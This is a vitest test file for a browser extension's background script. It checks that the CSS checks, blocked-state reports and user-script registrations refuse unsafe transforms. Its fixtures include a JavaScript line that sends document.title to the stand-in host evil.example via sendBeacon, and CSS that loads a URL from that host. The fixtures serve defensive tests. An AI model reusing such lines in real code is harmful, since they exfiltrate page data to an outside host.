/**
 * The wiring in src/background/index.ts that connects the CSS check, the
 * blocked-state reports and the registrations to the browser (#50, #57, #62,
 * #63, #80).
 *
 * handlers.test.ts and css-gate.test.ts test the functions with stubbed
 * dependencies, so a call in index.ts that passes the wrong address or leaves a
 * step out failed no test. These tests load the real index.ts through
 * test-browser.ts and send the messages and navigation events the browser
 * sends. Each test is paired with a control that shows the stub reaches the same
 * result in the case the check allows.
 */

import { beforeEach, describe, expect, it } from 'vitest'
import { DEFAULT_SETTINGS } from '@shared/types'
import { createHarness, cssTransform, type Harness } from './test-browser'

const TAB = 1
const SHOP = 'https://shop.example.com/cart'
const BG = 'a { background: url(/bg.png) }'
const GOOD_JS = "document.querySelector('aside').style.display = 'none'"
/** Copies navigator into a variable, which the analyser refuses. */
const BAD_JS = "const n = navigator; n.sendBeacon('https://evil.example/', document.title)"
const EVIL_CSS = 'a { background: url(https://evil.example/t) }'

const sameOrigin = { ...DEFAULT_SETTINGS, cssUrlPolicy: { 'shop.example.com': 'same-origin' as const } }

let h: Harness
const settle = () => new Promise((resolve) => setTimeout(resolve, 20))
const commit = (url: string, qualifiers?: string[]) =>
  h.listeners.get('browser.webNavigation.onCommitted')!({
    frameId: 0,
    tabId: TAB,
    url,
    ...(qualifiers ? { transitionQualifiers: qualifiers } : {}),
  })
const inserted = (needle: string) => h.calls.insertCSS.filter((c) => c.css.includes(needle))
const removed = (needle: string) => h.calls.removeCSS.filter((c) => c.css.includes(needle))

/** Boots with the transforms and settings stored and the tab on `url`. */
async function start(transforms: object[], settings: object = DEFAULT_SETTINGS, url = SHOP) {
  h.local.set('transforms', transforms)
  h.local.set('settings', settings)
  h.tabUrls.set(TAB, url)
  h.contentReply = (message) =>
    message.type === 'ping' ? true : { type: 'health-check-result', states: [] }
  await h.boot()
}

async function ask(message: unknown): Promise<any> {
  const reply = await h.onMessage(message)
  if (!reply.ok) throw new Error(reply.error.message)
  return reply.data
}

beforeEach(() => {
  h = createHarness()
  h.hasUserScripts = true
})

const shopCss = cssTransform({ id: 'c1', match: 'shop.example.com/*', code: BG })

describe('stored CSS applied on a navigation', () => {
  it('is checked against the address of the tab, so a same-origin address is inserted', async () => {
    await start([shopCss], sameOrigin)
    await commit(SHOP)
    expect(inserted('url(/bg.png)')).toHaveLength(1)
  })

  it('is left out where the site has no setting that allows the address (control)', async () => {
    await start([shopCss], DEFAULT_SETTINGS)
    await commit(SHOP)
    expect(inserted('url(/bg.png)')).toHaveLength(0)
  })
})

describe('the tab address in the CSS checks (#50, #62)', () => {
  // A pattern for the whole domain gives https://example.com/ when the address
  // is taken from it, and the setting is for the shop host, so only the real
  // address of the tab allows the same-origin reference.
  const wide = '*.example.com/*'

  it('preview-css checks the CSS against the tab', async () => {
    await start([], sameOrigin)
    expect((await h.onMessage({ type: 'preview-css', tabId: TAB, css: BG })).ok).toBe(true)
  })

  it('preview-css refuses the same CSS on a tab of a site with no setting (control)', async () => {
    await start([], sameOrigin, 'https://other.example.org/')
    expect((await h.onMessage({ type: 'preview-css', tabId: TAB, css: BG })).ok).toBe(false)
    expect(inserted('url(/bg.png)')).toHaveLength(0)
  })

  it('save-transform checks CSS against the tab it was saved from', async () => {
    await start([], sameOrigin)
    const saved = cssTransform({ id: 'new', match: wide, code: BG })
    await ask({ type: 'save-transform', transform: saved, tabId: TAB })
    expect((h.local.get('transforms') as any[]).map((t) => t.id)).toContain('new')
  })

  it('save-transform refuses the same CSS from a tab of another site (control)', async () => {
    await start([], sameOrigin, 'https://example.com/')
    const saved = cssTransform({ id: 'new', match: wide, code: BG })
    const reply = await h.onMessage({ type: 'save-transform', transform: saved, tabId: TAB })
    expect(reply.ok).toBe(false)
  })

  it('analyse-css checks CSS against the tab', async () => {
    await start([], sameOrigin)
    const result = await ask({ type: 'analyse-css', css: BG, match: wide, tabId: TAB })
    expect(result.passed).toBe(true)
  })

  it('analyse-css fails the same CSS for a tab of another site (control)', async () => {
    await start([], sameOrigin, 'https://example.com/')
    const result = await ask({ type: 'analyse-css', css: BG, match: wide, tabId: TAB })
    expect(result.passed).toBe(false)
  })
})

describe('a change to the per-site CSS setting (#50)', () => {
  const tighten = { ...DEFAULT_SETTINGS, cssUrlPolicy: {} }

  it('save-settings takes CSS the new setting refuses out of open tabs', async () => {
    await start([shopCss], sameOrigin)
    await commit(SHOP)
    expect(inserted('url(/bg.png)')).toHaveLength(1)
    await ask({ type: 'save-settings', settings: tighten })
    expect(removed('url(/bg.png)')).toHaveLength(1)
  })

  it('is not carried by patch-settings, which takes only the top-level fields it lists', async () => {
    // The sidebar changes settings with this message. A per-site setting sent
    // through it is ignored, so there is nothing for it to reapply.
    await start([shopCss], sameOrigin)
    await commit(SHOP)
    await ask({ type: 'patch-settings', change: { kind: 'fields', fields: { cssUrlPolicy: {} } as never } })
    expect((h.local.get('settings') as any).cssUrlPolicy).toEqual(sameOrigin.cssUrlPolicy)
    expect(removed('url(/bg.png)')).toHaveLength(0)
  })

  it('leaves the CSS in place when a setting that does not affect CSS changes (control)', async () => {
    await start([shopCss], sameOrigin)
    await commit(SHOP)
    await ask({ type: 'save-settings', settings: { ...sameOrigin, accent: 'ember' } })
    expect(removed('url(/bg.png)')).toHaveLength(0)
  })
})

describe('importing transforms (#50)', () => {
  async function bundleOf(over: Record<string, unknown>) {
    await start([cssTransform({ id: 'src', ...over })], DEFAULT_SETTINGS)
    const bundle = await ask({ type: 'export-transforms' })
    h.local.set('transforms', [])
    return bundle
  }
  const imported = () => (h.local.get('transforms') as any[])[0]

  it('imports CSS that fails the check with no code, disabled', async () => {
    const bundle = await bundleOf({ code: EVIL_CSS })
    await ask({ type: 'import-transforms', bundle })
    expect(imported().code).toBe('')
    expect(imported().enabled).toBe(false)
  })

  it('imports CSS that passes the check as it is (control)', async () => {
    const bundle = await bundleOf({ code: 'aside { display: none }' })
    await ask({ type: 'import-transforms', bundle })
    expect(imported().code).toBe('aside { display: none }')
    expect(imported().enabled).toBe(true)
  })

  it('ignores the approvals that came in the file, even where the site lists addresses', async () => {
    const listing = { ...DEFAULT_SETTINGS, cssUrlPolicy: { 'example.com': 'list-external' as const } }
    h.local.set('settings', listing)
    const bundle = await bundleOf({ code: EVIL_CSS, approvedCssUrls: ['https://evil.example/t'] })
    h.local.set('settings', listing)
    await ask({ type: 'import-transforms', bundle })
    expect(imported().code).toBe('')
    expect(imported().approvedCssUrls).toBeUndefined()
  })
})

describe('stored JavaScript whose code the analyser refuses (#62, #63)', () => {
  const script = (code: string) =>
    cssTransform({ id: 'j1', kind: 'js', origin: 'user', world: 'USER_SCRIPT', code, match: 'shop.example.com/*' })

  it('get-blocked-states lists it as broken', async () => {
    await start([script(BAD_JS), cssTransform({ id: 'ok', kind: 'js', world: 'USER_SCRIPT', code: GOOD_JS, match: 'shop.example.com/*' })])
    const states = await ask({ type: 'get-blocked-states', url: SHOP })
    expect(states.map((s: any) => [s.id, s.status])).toEqual([['j1', 'broken']])
  })

  it('get-blocked-states lists nothing for code that passes (control)', async () => {
    await start([script(GOOD_JS)])
    expect(await ask({ type: 'get-blocked-states', url: SHOP })).toEqual([])
  })

  it('check-now includes it in the result and marks the badge', async () => {
    await start([script(BAD_JS)])
    const states = await ask({ type: 'check-now', tabId: TAB, url: SHOP })
    expect(states.map((s: any) => [s.id, s.status])).toEqual([['j1', 'broken']])
    expect(h.calls.setBadgeText.some((c) => c.tabId === TAB && c.text === '!')).toBe(true)
  })

  it('check-now reports nothing broken for code that passes (control)', async () => {
    await start([script(GOOD_JS)])
    const states = await ask({ type: 'check-now', tabId: TAB, url: SHOP })
    expect(states.filter((s: any) => s.status === 'broken')).toEqual([])
  })

  it('the check after a page load publishes it', async () => {
    await start([script(BAD_JS)])
    await commit(SHOP)
    await settle()
    const published = h.calls.runtimeMessages.filter((m) => m.type === 'health-check-result')
    expect(published.flatMap((m) => m.states.map((s: any) => [s.id, s.status]))).toEqual([['j1', 'broken']])
  })

  it('the check after a page load publishes nothing broken for code that passes (control)', async () => {
    await start([script(GOOD_JS)])
    await commit(SHOP)
    await settle()
    const published = h.calls.runtimeMessages.filter((m) => m.type === 'health-check-result')
    expect(published.flatMap((m) => m.states).filter((s: any) => s.status === 'broken')).toEqual([])
  })

  it('is unregistered when the stored code stops passing, not left running', async () => {
    await start([script(GOOD_JS)])
    expect(h.userScriptsHeld.has('j1')).toBe(true)
    h.local.set('transforms', [script(BAD_JS)])
    await ask({ type: 'reapply-everywhere', id: 'j1' })
    expect(h.userScriptsHeld.has('j1')).toBe(false)
  })

  it('stays registered when the stored code still passes (control)', async () => {
    await start([script(GOOD_JS)])
    await ask({ type: 'reapply-everywhere', id: 'j1' })
    expect(h.userScriptsHeld.has('j1')).toBe(true)
  })
})

describe('a save of JavaScript while a preview is ending (#91)', () => {
  const js = (code: string) =>
    cssTransform({ id: 'saved', kind: 'js', origin: 'user', world: 'USER_SCRIPT', code, match: 'shop.example.com/*' })
  const NEW_CODE = GOOD_JS + ';'
  const heldCode = () => JSON.stringify(h.userScriptsHeld.get('saved'))

  /**
   * Ending a preview registers the saved script again and then removes the
   * preview's id from the list kept in storage.session, as one task in the
   * registry queue. The write of that list is held, and a save is sent while it
   * waits. The approval is obtained before the hold, because it is stored in
   * the same area.
   */
  async function saveWhileEnding() {
    await start([js(GOOD_JS)])
    h.tabUrls.set(3, 'https://shop.example.com/')
    await ask(await h.approvedPreview({ type: 'preview-js', tabId: 3, transform: js(GOOD_JS + ' // draft') }))
    const { approvalToken } = await ask({
      type: 'approve-code',
      code: NEW_CODE,
      declaredCapabilities: [],
      world: 'USER_SCRIPT',
      transformId: 'saved',
      match: 'shop.example.com/*',
    })
    // The ending task also writes the error tokens (#123) to the same area.
    // Those writes are let through, so the write that waits is the one that
    // removes the preview's id from the list.
    const release = h.hold('browser.storage.session.set', { exceptKeys: ['wa-error-tokens'] })
    const ended = h.onMessage({ type: 'clear-preview-js', id: 'saved' })
    await settle()
    const saved = h.onMessage({ type: 'save-transform', transform: js(NEW_CODE), approvalToken })
    await settle()
    return { release, both: () => Promise.all([ended, saved]) }
  }

  it('registers the saved code only after the preview has ended', async () => {
    const { release, both } = await saveWhileEnding()
    // The ending task has registered the stored script again, with the old code,
    // and has not finished. The save waits behind it.
    expect(heldCode()).toContain(JSON.stringify(GOOD_JS).slice(1, -1))
    expect(heldCode()).not.toContain(JSON.stringify(NEW_CODE).slice(1, -1))
    release()
    await both()
    expect(heldCode()).toContain(JSON.stringify(NEW_CODE).slice(1, -1))
  })

  it('registers the saved code at once when no preview is ending (control)', async () => {
    await start([js(GOOD_JS)])
    const { approvalToken } = await ask({
      type: 'approve-code',
      code: NEW_CODE,
      declaredCapabilities: [],
      world: 'USER_SCRIPT',
      transformId: 'saved',
      match: 'shop.example.com/*',
    })
    await ask({ type: 'save-transform', transform: js(NEW_CODE), approvalToken })
    expect(heldCode()).toContain(JSON.stringify(NEW_CODE).slice(1, -1))
  })
})
